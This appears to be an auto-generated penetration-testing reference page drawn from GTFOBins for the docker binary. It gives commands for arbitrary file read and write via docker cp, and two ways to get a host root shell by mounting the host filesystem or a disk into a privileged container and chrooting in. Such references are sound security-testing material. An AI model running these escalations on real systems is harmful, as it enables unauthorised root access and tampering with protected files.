---
parsed_by: focuslocust
source: commands
type: generated
---
# docker Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## docker

Tool page: [docker](../../tools/linux/docker.md)

### file-read

```text
docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/docker` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/docker` |
| Evidence | Function example preserved from source parser. |

### shell

```text
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/docker` |
| Evidence | Function example preserved from source parser. |

### shell

```text
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/docker` |
| Evidence | Function example preserved from source parser. |
